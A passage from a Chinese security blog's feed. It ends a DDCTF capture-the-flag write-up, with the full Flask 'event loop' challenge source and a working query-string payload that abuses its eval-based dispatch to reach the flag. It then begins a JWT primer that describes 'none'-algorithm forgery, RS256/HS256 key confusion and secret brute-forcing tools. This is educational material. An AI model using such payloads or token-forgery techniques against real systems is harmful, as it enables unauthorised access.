-o</span><br><span class="line">cat ./* | grep DD</span><br></pre></td></tr></table></figure><p>flag</p><p><code>DDCTF{b5f49e210662301ac0f6f3a6526106f1}</code></p><hr><h2 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h2><p>图片最低位提取 7SsQWmZ524i/yVWoMeAIJA==</p><p>aes 解密</p><p><a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptaes</a></p><p>密钥是 ：weigongcun</p><p>DDCTF{Q*2!x@B0}</p><hr><h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 2.7</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">'/d5afe1f66147e857'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span></span><br><span class="line">session[<span class="string">'log'</span>].append(event)</span><br><span class="line"><span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">if</span> type(event) == type([]):</span><br><span class="line">request.event_queue += event</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span></span><br><span class="line">haystack = haystack[haystack.find(prefix)+len(prefix):]</span><br><span class="line"><span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">haystack = haystack[:haystack.find(postfix)]</span><br><span class="line"><span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span></span><br><span class="line">valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>)</span><br><span class="line">resp = <span class="literal">None</span></span><br><span class="line"><span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span></span><br><span class="line">request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line"><span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">is_action = event[<span class="number">0</span>] == <span class="string">'a'</span></span><br><span class="line">action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>)</span><br><span class="line">args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>))</span><br><span class="line">ret_val = event_handler(args)</span><br><span class="line"><span class="keyword">except</span> RollBackException:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line">resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span></span><br><span class="line">resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>]</span><br><span class="line">session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = <span class="string">''</span></span><br><span class="line"><span class="comment">#resp += str(e) # only for debugging</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>: resp = ret_val</span><br><span class="line"><span class="keyword">else</span>: resp += ret_val</span><br><span class="line"><span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>)</span><br><span class="line">session.modified = <span class="literal">True</span></span><br><span class="line"><span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(url_prefix+'/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span></span><br><span class="line">querystring = urllib.unquote(request.query_string)</span><br><span class="line">request.event_queue = []</span><br><span class="line"><span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">querystring = <span class="string">'action:index;False#False'</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">session[<span class="string">'num_items'</span>] = <span class="number">0</span></span><br><span class="line">session[<span class="string">'points'</span>] = <span class="number">3</span></span><br><span class="line">session[<span class="string">'log'</span>] = []</span><br><span class="line">request.prev_session = dict(session)</span><br><span class="line">trigger_event(querystring)</span><br><span class="line"><span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">page = args[<span class="number">0</span>]</span><br><span class="line">html = <span class="string">''</span></span><br><span class="line">html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>])</span><br><span class="line"><span class="keyword">if</span> page == <span class="string">'index'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">elif</span> page == <span class="string">'shop'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">elif</span> page == <span class="string">'reset'</span>:</span><br><span class="line"><span class="keyword">del</span> session[<span class="string">'num_items'</span>]</span><br><span class="line">html += <span class="string">'Session reset.&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">bool_show_source = str(args[<span class="number">0</span>])</span><br><span class="line">bool_download_source = str(args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>:</span><br><span class="line"></span><br><span class="line">source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>)</span><br><span class="line">html = <span class="string">''</span></span><br><span class="line"><span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line">html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line"><span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>:</span><br><span class="line">html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">html += line</span><br><span class="line">source.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>:</span><br><span class="line">headers = &#123;&#125;</span><br><span class="line">headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span></span><br><span class="line">headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span></span><br><span class="line"><span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> html</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span></span><br><span class="line">num_items = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>])</span><br><span class="line">session[<span class="string">'num_items'</span>] += num_items </span><br><span class="line">trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span></span><br><span class="line">point_to_consume = int(args[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException()</span><br><span class="line">session[<span class="string">'points'</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span></span><br><span class="line">flag = args[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span></span><br><span class="line"><span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">trigger_event(<span class="string">'func:show_flag;'</span> + FLAG()) <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">trigger_event(<span class="string">'action:view;index'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">app.run(debug=<span class="literal">False</span>, host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>代码逻辑不难理解</p><p>解题思路是向 trigger_event 函数里传入数组，往队列里添加 get_flag,虽然页面得不到 flag 回显，但是 session 的 log 里会有记录</p><p>通过 <code>#</code>, eval 执行 trigger_event，也由 <code>#</code> 分割，传入buy_handler 和 get_flag </p><p>payload</p><p><code>http://116.85.48.107:5002/d5afe1f66147e857/?action:trigger_event%23;action:buy;10%23action:buy;10%23action:get_flag;0</code></p><p>flag : <code>DDCTF{3v41_3v3nt_100p_aNd_fLASK_c0Ok1e}</code></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="WriteUp" scheme="http://j0k3r.top/tags/WriteUp/"/>
    
  </entry>
  
  <entry>
    <title>JSON Web Token（JWT）初探</title>
    <link href="http://j0k3r.top/2019/03/02/jwt-notes/"/>
    <id>http://j0k3r.top/2019/03/02/jwt-notes/</id>
    <published>2019-03-01T16:00:00.000Z</published>
    <updated>2019-03-09T08:37:50.834Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>JSON Web Token 是一个开放标准( RFC 7519 )，它定义了一种紧凑且独立的方式，以 JSON 对象的形式在各方之间安全地传输信息。</p></blockquote><a id="more"></a><h2 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h2><blockquote><p>不同的人对JWT也有着不同的看法，下面是我的理解</p></blockquote><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>简单来说，用户在经服务端认证成功后，返回一个带签名的json对象，此后用户的访问通信都由此json对象向服务端表明自己身份</p><p><img src="https://i.loli.net/2019/03/02/5c7a4ac6c081e.png" alt></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul><li>服务器无需保存大量session数据，从有状态服务变为了无状态服务，这样有一个好处就是容易实现服务器的横向拓展，能够更好的实现负载均衡</li><li>数据共享性强，因为服务器不保存JWT，每台服务器都能获取用户信息，利于实现跨域认证</li><li>利于项目的前后端分离</li></ul><h2 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h2><p>JWT具体表现为一个 token 字符串，形如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE</span><br></pre></td></tr></table></figure><p>JWT由头部（header）、载荷（payload）与签名（signature）三部分组成，以“.”分割</p><p>前两部分可被 base64 解码为 json格式的字符串，签名则是通过指定算法对前两部分的加密所生成的信息，如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure><p>JWT其实是URL-safe的，因为其可能会被用于在URL中传递，为了避免URL解析错误，JWT的base64稍有些不同，具体实现可参考如下php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">base64UrlEncode</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$data = base64_encode($string);</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>,<span class="string">'='</span>),<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>,<span class="string">''</span>),$data);</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">base64UrlDecode</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">$data = str_replace(<span class="keyword">array</span>(<span class="string">'-'</span>,<span class="string">'_'</span>),<span class="keyword">array</span>(<span class="string">'+'</span>,<span class="string">'/'</span>),$string);</span><br><span class="line">$mod4 = strlen($data) % <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">if</span> ($mod4) &#123;</span><br><span class="line">      $data .= substr(<span class="string">'===='</span>, $mod4);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_decode($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h3><p>示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">  <span class="attr">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alg 表示签名算法（algorithm），且默认是 HMAC SHA256，是一种使用单向散列函数来构造消息认证码的方法。</p><p>typ 表示类型，为与传统实现兼容，统一使用大写的JWT</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>payload是JWT的核心内容，存放一些要传递的数据，可以定义私有字段</p><p>官方字段示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"iss"</span>: <span class="string">"xxx"</span></span><br><span class="line">  <span class="string">"sub"</span>: <span class="string">"xxx"</span>,</span><br><span class="line">  <span class="attr">"aud"</span>: <span class="string">"xxx"</span>,</span><br><span class="line">  <span class="attr">"exp"</span>: <span class="number">1551518526</span>,</span><br><span class="line">  <span class="attr">"nbf"</span>: <span class="number">1551514827</span>,</span><br><span class="line">  <span class="attr">"iat"</span>: <span class="number">1551514827</span>,</span><br><span class="line">  <span class="attr">"jti"</span>: <span class="string">"xxx"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>“iss” (Issuer) Claim</li><li>“sub” (Subject) Claim</li><li>“aud” (Audience) Claim</li><li>“exp” (Expiration Time) Claim</li><li>“nbf” (Not Before) Claim</li><li>“iat” (Issued At) Claim</li><li>“jti” (JWT ID) Claim</li></ul><p>一些敏感信息放在payload中可能会造成一些安全问题</p><h3 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h3><p>signature 是对前两部分的签名，防止数据篡改</p><p>其使用的 secret key 存在服务端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">GenToken</span><span class="params">(array $header,array $payload)</span></span>&#123;</span><br><span class="line">$jwt_header = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($header));</span><br><span class="line">$jwt_payload = <span class="keyword">$this</span>-&gt;base64UrlEncode(json_encode($payload));</span><br><span class="line">$jwt_hap = $jwt_header.<span class="string">"."</span>.$jwt_payload;</span><br><span class="line">$signature = <span class="keyword">$this</span>-&gt;base64UrlEncode(hash_hmac(<span class="string">'sha256'</span>,$jwt_hap,<span class="keyword">$this</span>-&gt;secret_key,<span class="keyword">true</span>));</span><br><span class="line">$jwt_token = $jwt_hap.<span class="string">"."</span>.$signature;</span><br><span class="line">setcookie(<span class="string">"token"</span>,$jwt_token);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="JWT-安全"><a href="#JWT-安全" class="headerlink" title="JWT 安全"></a>JWT 安全</h2><p>通过 <a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a> 的 Debugger 验证和生成JWT</p><h3 id="使用“none”算法的JWT"><a href="#使用“none”算法的JWT" class="headerlink" title="使用“none”算法的JWT"></a>使用“none”算法的JWT</h3><p>部分JWT库在alg为none，signature为空时通过验证，以此可以构造任意payload欺骗服务器</p><p>漏洞示例：<a href="https://nvd.nist.gov/vuln/detail/CVE-2018-1000531" target="_blank" rel="noopener">CVE-2018-1000531</a></p><h3 id="更改-RS256-为-HS256"><a href="#更改-RS256-为-HS256" class="headerlink" title="更改 RS256 为 HS256"></a>更改 RS256 为 HS256</h3><p>当服务器算法类型为 RS256 这种非对称加密算法时，如果修改算法类型为 HS256，服务器可能把原来的 public key 当作 secret key，此时我们就可以通过 HS256 算法用 public key 加密伪造的 payload 通过服务器验证</p><h3 id="爆破-secret-key"><a href="#爆破-secret-key" class="headerlink" title="爆破 secret key"></a>爆破 secret key</h3><p>如果服务器的密钥较短的话可以使用爆破</p><p>爆破工具：</p><p><a href="https://github.com/jmaxxz/jwtbrute" target="_blank" rel="noopener">jwtbrute</a></p><p><a href="https://github.com/Sjord/jwtcrack" target="_blank" rel="noopener">jwtcrack</a></p><p><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">JWT cracker</a></p><h2 id="使用JWT"><a href="#使用JWT" class="headerlink" title="使用JWT"></a>使用JWT</h2><p><strong>服务端</strong></p><p><a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/ </a> 中已经列出了很多JWT的签名/验证库以供使用</p><p>如 pyjwt、python-jose、jsonwebtoken</p><p><strong>python-jose常用方法:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jose <span class="keyword">import</span> jwt,jws,jwk</span><br><span class="line"><span class="keyword">from</span> jose.utils <span class="keyword">import</span> base64url_decode</span><br><span class="line"></span><br><span class="line">token = jwt.encode(&#123;<span class="string">'key'</span>: <span class="string">'value'</span>&#125;, <span class="string">'secret'</span>, algorithm=<span class="string">'HS256'</span>)</span><br><span class="line"><span class="keyword">print</span> token</span><br><span class="line"><span class="keyword">print</span> jwt.decode(token, <span class="string">'secret'</span>, algorithms=<span class="string">'HS256'</span>)</span><br><span class="line"></span><br><span class="line">signed = jws.sign(&#123;<span class="string">'a'</span>: <span class="string">'b'</span>&#125;, <span class="string">'secret'</span>, algorithm=<span class="string">'HS256'</span>)</span><br><span class="line"><span class="keyword">print</span> jws.verify(signed, <span class="string">'secret'</span>, algorithms=[<span class="string">'HS256'</span>])</span><br><span class="line"></span><br><span class="line">token = <span class="string">"eyJhbGciOiJIUzI1NiIsImtpZCI6IjAxOGMwYWU1LTRkOWItNDcxYi1iZmQ2LWVlZjMxNGJjNzAzNyJ9.SXTigJlzIGEgZGFuZ2Vyb3VzIGJ1c2luZXNzLCBGcm9kbywgZ29pbmcgb3V0IHlvdXIgZG9vci4gWW91IHN0ZXAgb250byB0aGUgcm9hZCwgYW5kIGlmIHlvdSBkb24ndCBrZWVwIHlvdXIgZmVldCwgdGhlcmXigJlzIG5vIGtub3dpbmcgd2hlcmUgeW91IG1pZ2h0IGJlIHN3ZXB0IG9mZiB0by4.s0h6KThzkfBBBkLspW1h84VsJZFTsPPqMDA7g1Md7p0"</span></span><br><span class="line"></span><br><span class="line">hmac_key = &#123;</span><br><span class="line">    <span class="string">"kty"</span>: <span class="string">"oct"</span>,</span><br><span class="line">    <span class="string">"kid"</span>: <span class="string">"018c0ae5-4d9b-471b-bfd6-eef314bc7037"</span>,</span><br><span class="line">    <span class="string">"use"</span>: <span class="string">"sig"</span>,</span><br><span class="line">    <span class="string">"alg"</span>: <span class="string">"HS256"</span>,</span><br><span class="line">    <span class="string">"k"</span>: <span class="string">"hJtXIZ2uSN5kbQfbtTNWbpdmhkV8FJG-Onbc6mxCcYg"</span></span><br><span class="line">&#125;</span><br><span class="line">key = jwk.construct(hmac_key)</span><br><span class="line">message, encoded_sig = token.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)</span><br><span class="line">decoded_sig = base64url_decode(str(encoded_sig))</span><br><span class="line"><span class="keyword">print</span> key.verify(message, decoded_sig)</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ2YWx1ZSJ9.FG<span class="number">-8</span>UppwHaFp1LgRYQQeS6EDQF7_6-bMFegNucHjmWg</span><br><span class="line">&#123;<span class="string">u'key'</span>: <span class="string">u'value'</span>&#125;</span><br><span class="line">&#123;<span class="string">"a"</span>:<span class="string">"b"</span>&#125;</span><br><span class="line"><span 